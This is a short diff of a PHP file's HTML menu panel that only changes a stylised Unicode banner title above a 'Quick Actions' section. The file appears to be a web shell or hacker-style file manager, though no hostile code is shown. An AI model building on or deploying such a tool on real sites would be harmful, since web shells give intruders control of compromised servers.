@@ -3301,7 +3301,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M - 𝒮𝒜𝑀𝐵𝒪:: ~ 280326 2112</h1>
+        <h1>::𝒮 𝒜 𝑀 𝐵 𝒪 - 𝒢 𝐸 𝒯 𝐸 𝑅:: ~ 280326 2112</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
